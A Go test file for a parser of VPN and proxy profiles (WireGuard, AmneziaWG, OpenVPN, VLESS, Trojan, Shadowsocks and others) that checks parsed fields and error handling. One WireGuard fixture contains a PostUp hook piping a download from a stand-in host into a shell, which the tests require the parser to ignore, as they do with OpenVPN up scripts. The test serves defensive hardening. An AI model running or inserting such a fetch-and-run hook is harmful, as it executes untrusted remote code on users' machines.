package profile

import (
	"encoding/base64"
	"strings"
	"testing"
)

var k1 = base64.StdEncoding.EncodeToString([]byte("0123456789abcdef0123456789abcdef"))
var k2 = base64.StdEncoding.EncodeToString([]byte("fedcba9876543210fedcba9876543210"))

func TestWireGuard(t *testing.T) {
	conf := `
[Interface]
# our VPS
PrivateKey = ` + k1 + `
Address = 10.8.0.2/32, fd00::2/128
DNS = 1.1.1.1, example.internal
MTU = 1420
PostUp = curl evil | sh

[Peer]
PublicKey = ` + k2 + `
PresharedKey = ` + k1 + `
Endpoint = vps.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
`
	p, err := Parse(conf)
	if err != nil {
		t.Fatal(err)
	}
	if p.Kind != WireGuard || p.Host != "vps.example.com" || p.Port != 51820 {
		t.Fatalf("got %v %s:%d", p.Kind, p.Host, p.Port)
	}
	w := p.WG
	if len(w.Addresses) != 2 || len(w.DNS) != 1 || w.MTU != 1420 || !w.FullTunnel() {
		t.Fatalf("bad interface %+v", w)
	}
	if w.Peers[0].Keepalive != 25 || w.Peers[0].PresharedKey == nil {
		t.Fatal("bad peer")
	}
	if len(p.Ignored) != 1 || p.Ignored[0] != "postup" {
		t.Fatalf("PostUp must be ignored, got %v", p.Ignored)
	}
	s := p.Summary()
	if s.Label != "WireGuard" || s.Server != "vps.example.com:51820" {
		t.Fatalf("summary %+v", s)
	}
	w.Wipe()
	if w.PrivateKey != (Key{}) || *w.Peers[0].PresharedKey != (Key{}) {
		t.Fatal("wipe left key material")
	}
}

// copied straight out of a terminal: the command before, the prompt after
func TestWireGuardFromTerminal(t *testing.T) {
	paste := "root@vps:~# WG=wg0; IP=10.8.0.2\nroot@vps:~# cat <<EOF\n> [Interface]\n" +
		"[Interface]\nPrivateKey = " + k1 + "\nAddress = 10.8.0.2/32\n\n[Peer]\nPublicKey = " + k2 +
		"\nEndpoint = 77.91.123.91:51820\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = 25\n\nroot@vps:~# \n"
	p, err := Parse(paste)
	if err != nil {
		t.Fatal(err)
	}
	if p.Host != "77.91.123.91" || p.WG.Peers[0].Keepalive != 25 {
		t.Fatalf("got %s %+v", p.Host, p.WG.Peers[0])
	}
	// a stray setting inside the config is still an error, with the original line number
	_, err = Parse("$ x\n[Interface]\nPrivateKey = " + k1 + "\nnot a setting\n[Peer]\n")
	if err == nil || !strings.Contains(err.Error(), "line 4") {
		t.Fatalf("want a line-4 error, got %v", err)
	}
}

func TestAmneziaWG(t *testing.T) {
	conf := "[Interface]\nPrivateKey=" + k1 + "\nAddress=10.0.0.2/32\nJc = 4\nJmin=40\nJmax=70\nS1=15\nS2=42\nH1=1\nH2=2\nH3=3\nH4=4\n[Peer]\nPublicKey=" + k2 + "\nEndpoint=1.2.3.4:443\nAllowedIPs=0.0.0.0/0\n"
	p, err := Parse(conf)
	if err != nil {
		t.Fatal(err)
	}
	if p.Kind != AmneziaWG || len(p.WG.AWG) != 9 || p.WG.AWG[0] != [2]string{"jc", "4"} {
		t.Fatalf("got %v %v", p.Kind, p.WG.AWG)
	}
	// all-zero obfuscation is plain WireGuard
	p, err = Parse(strings.NewReplacer("Jc = 4", "Jc = 0", "Jmin=40", "", "Jmax=70", "", "S1=15", "", "S2=42", "", "H1=1", "", "H2=2", "", "H3=3", "", "H4=4", "").Replace(conf))
	if err != nil || p.Kind != WireGuard {
		t.Fatalf("zero AWG params should be WireGuard: %v %v", p, err)
	}
}

func TestWireGuardErrors(t *testing.T) {
	for name, conf := range map[string]string{
		"no key":      "[Interface]\nAddress=10.0.0.2/32\n[Peer]\nPublicKey=" + k2 + "\nEndpoint=1.2.3.4:1\n",
		"bad key":     "[Interface]\nPrivateKey=abc\nAddress=10.0.0.2/32\n",
		"no endpoint": "[Interface]\nPrivateKey=" + k1 + "\nAddress=10.0.0.2/32\n[Peer]\nPublicKey=" + k2 + "\n",
		"no peer":     "[Interface]\nPrivateKey=" + k1 + "\nAddress=10.0.0.2/32\n",
		"awg 2.0":     "[Interface]\nPrivateKey=" + k1 + "\nAddress=10.0.0.2/32\nS3=1\n",
	} {
		if _, err := Parse(conf); err == nil {
			t.Errorf("%s: expected an error", name)
		}
	}
}

func TestLinks(t *testing.T) {
	cases := []struct {
		link string
		kind Kind
		host string
		port uint16
		chk  func(*Proxy) bool
	}{
		{"vless://11111111-2222-3333-4444-555555555555@vps.example.com:443?type=tcp&security=reality&pbk=PUBKEY&sid=ab12&sni=www.microsoft.com&fp=chrome&flow=xtls-rprx-vision#May%20VPS",
			VLESS, "vps.example.com", 443, func(x *Proxy) bool {
				return x.Security == "reality" && x.RealityPub == "PUBKEY" && x.SNI == "www.microsoft.com" && x.Flow == "xtls-rprx-vision"
			}},
		{"vless://uuid@1.2.3.4:8443?type=ws&security=tls&path=%2Fws&host=cdn.example.com#x", VLESS, "1.2.3.4", 8443,
			func(x *Proxy) bool {
				return x.Transport == "ws" && x.Path == "/ws" && x.HostHeader == "cdn.example.com"
			}},
		{"trojan://secret@vps.example.com:443?sni=vps.example.com#t", Trojan, "vps.example.com", 443,
			func(x *Proxy) bool { return x.Password == "secret" && x.Security == "tls" }},
		{"hysteria2://pw@vps.example.com:8443?obfs=salamander&obfs-password=oo&sni=a.b#h", Hysteria2, "vps.example.com", 8443,
			func(x *Proxy) bool { return x.Obfs == "salamander" && x.ObfsPassword == "oo" && x.SNI == "a.b" }},
		{"hy2://pw@[2001:db8::1]:443", Hysteria2, "2001:db8::1", 443, func(x *Proxy) bool { return x.Password == "pw" }},
		{"ss://" + base64.RawURLEncoding.EncodeToString([]byte("chacha20-ietf-poly1305:pass")) + "@vps.example.com:8388#ss", Shadowsocks, "vps.example.com", 8388,
			func(x *Proxy) bool { return x.Method == "chacha20-ietf-poly1305" && x.Password == "pass" }},
		{"ss://2022-blake3-aes-128-gcm:YWJjZGVmZ2hpamtsbW5vcA%3D%3D@1.2.3.4:443", Shadowsocks, "1.2.3.4", 443,
			func(x *Proxy) bool {
				return x.Method == "2022-blake3-aes-128-gcm" && x.Password == "YWJjZGVmZ2hpamtsbW5vcA=="
			}},
		{"ss://" + base64.StdEncoding.EncodeToString([]byte("aes-256-gcm:pw@5.6.7.8:1234")) + "#legacy", Shadowsocks, "5.6.7.8", 1234,
			func(x *Proxy) bool { return x.Method == "aes-256-gcm" }},
		{"vmess://" + base64.StdEncoding.EncodeToString([]byte(`{"v":"2","ps":"vm","add":"vps.example.com","port":"443","id":"uuid","aid":"0","net":"ws","path":"/v","host":"h.com","tls":"tls"}`)),
			VMess, "vps.example.com", 443, func(x *Proxy) bool { return x.Transport == "ws" && x.Security == "tls" && x.SNI == "h.com" }},
	}
	for _, c := range cases {
		p, err := Parse(c.link)
		if err != nil {
			t.Errorf("%s: %v", c.link, err)
			continue
		}
		if p.Kind != c.kind || p.Host != c.host || p.Port != c.port || !c.chk(p.Proxy) {
			t.Errorf("%s: got %v %s:%d %+v", c.link, p.Kind, p.Host, p.Port, p.Proxy)
		}
	}
	for _, bad := range []string{"vless://@host:1", "ss://bm9wZQ@h:1", "foo://x@y:1", "ss://YTpi@h:1?plugin=v2ray-plugin%3Bx", "vless://u@h:1?security=reality"} {
		if _, err := Parse(bad); err == nil {
			t.Errorf("%s: expected an error", bad)
		}
	}
}

func TestOpenVPN(t *testing.T) {
	conf := `client
dev tun
proto udp
remote vps.example.com 1194
remote 1.2.3.4 443 tcp
cipher AES-256-GCM
data-ciphers AES-256-GCM:CHACHA20-POLY1305
auth SHA256
key-direction 1
up /etc/openvpn/update-resolv-conf
script-security 2
<ca>
-----BEGIN CERTIFICATE-----
CA
-----END CERTIFICATE-----
</ca>
<cert>
CERT
</cert>
<key>
KEY
</key>
<tls-auth>
TA
</tls-auth>
`
	p, err := Parse(conf)
	if err != nil {
		t.Fatal(err)
	}
	o := p.OVPN
	if p.Kind != OpenVPN || p.Host != "vps.example.com" || p.Port != 1194 || len(o.Remotes) != 2 || o.Remotes[1].Network != "tcp" {
		t.Fatalf("remotes %+v", o.Remotes)
	}
	if o.WrapType != "tls_auth" || o.KeyDirection != "client" || len(o.DataCiphers) != 2 || !strings.Contains(o.CA, "CA") {
		t.Fatalf("ovpn %+v", o)
	}
	if strings.Join(p.Ignored, ",") != "up,script-security" {
		t.Fatalf("hooks must be ignored, got %v", p.Ignored)
	}
	if _, err := Parse("client\nremote a 1\nca /etc/ca.crt\n"); err == nil || !strings.Contains(err.Error(), "inline") {
		t.Fatalf("file references must be refused, got %v", err)
	}
}

func TestUnknown(t *testing.T) {
	if _, err := Parse("hello"); err != ErrUnknown {
		t.Fatal(err)
	}
}
